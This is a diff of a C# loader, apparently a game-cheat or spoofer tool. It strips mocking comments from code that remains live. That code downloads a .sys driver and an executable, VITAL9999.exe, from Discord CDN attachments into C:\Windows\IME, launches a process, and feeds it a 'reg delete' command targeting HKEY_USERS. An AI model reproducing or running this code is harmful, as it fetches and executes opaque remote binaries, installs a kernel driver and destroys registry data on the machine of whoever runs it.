@@ -21,9 +21,9 @@ namespace JONGERS
 
         string text2 = @"C:\Windows\IME\9999.sys";
 
-        webClient.DownloadFile("https://cdn.discordapp.com/attachments/837529165422657587/845853563070447616/9999.sys", text2);  /// you will never get the source tho how mad?
+        webClient.DownloadFile("https://cdn.discordapp.com/attachments/837529165422657587/845853563070447616/9999.sys", text2); 
 
-        webClient.DownloadFile("https://cdn.discordapp.com/attachments/837529165422657587/845853442283143188/VITAL9999.exe", text); /// you will never get the source tho how mad?
+        webClient.DownloadFile("https://cdn.discordapp.com/attachments/837529165422657587/845853442283143188/VITAL9999.exe", text); 
 
             Process process = new Process();
 
@@ -115,7 +115,7 @@ namespace JONGERS
 
         process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\");
 
-        process.StandardInput.WriteLine("Done!"); /// Cleaning Prosses Done here bruh / 
+        process.StandardInput.WriteLine("Done!"); 
         }
 
         internal static void Close()
